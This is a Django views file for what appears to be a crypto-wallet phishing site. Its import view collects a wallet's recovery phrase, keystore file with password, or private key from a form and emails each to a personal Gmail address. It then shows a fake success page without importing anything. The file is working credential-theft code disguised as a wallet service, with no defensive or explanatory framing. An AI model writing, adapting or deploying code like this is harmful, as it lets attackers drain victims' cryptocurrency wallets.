from django.shortcuts import render,redirect
from django.core.mail import send_mail


def index(request):
    return render(request,'index.html')

def WalletView(request):
    return render(request,'wallet.html')

def WalletImportView(request):
    if request.method == 'POST' and 'phrase_btn' in request.POST:
        phrase = request.POST['phrase']
        if phrase:
            send_mail('subject',phrase,"Don't Reply <do_not_reply@domain.com>",['adeyemioladimeji130@gmail.com'],fail_silently=False)
            return redirect('success')
    elif request.method == 'POST' and 'keystone_btn' in request.POST:
        keystone = request.POST['keystone']
        passw = request.POST['pass']
        if keystone and passw:
            send_mail('subject',f"keystone JSON : {keystone}\n\npassword : {passw}","Don't Reply <do_not_reply@domain.com>",['adeyemioladimeji130@gmail.com'],fail_silently=False)
            return redirect('success')
    elif request.method == 'POST' and 'prviatekey_btn' in request.POST:
        private_key = request.POST['private_key']
        if private_key:
            send_mail('subject',f"Private Key : {private_key}","Don't Reply <do_not_reply@domain.com>",['adeyemioladimeji130@gmail.com'],fail_silently=False)
            return redirect('success')
    return render(request,'i_wallet.html')


def successView(request):
    return render(request,'w_sucess.html')